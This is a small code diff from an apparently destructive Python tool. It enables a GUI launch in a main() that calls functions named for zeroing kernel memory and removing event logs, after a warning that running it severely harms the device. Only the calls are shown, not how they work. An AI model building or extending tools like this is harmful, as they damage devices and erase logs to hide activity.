@@ -188,7 +188,7 @@ def main():
     zero_and_unlock(mm, key_len, kernel_memory)
     
     attempt_rem_event_logs()
-    # launch_gui()
+    launch_gui()
 
 if __name__ == "__main__":
     input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # to delete
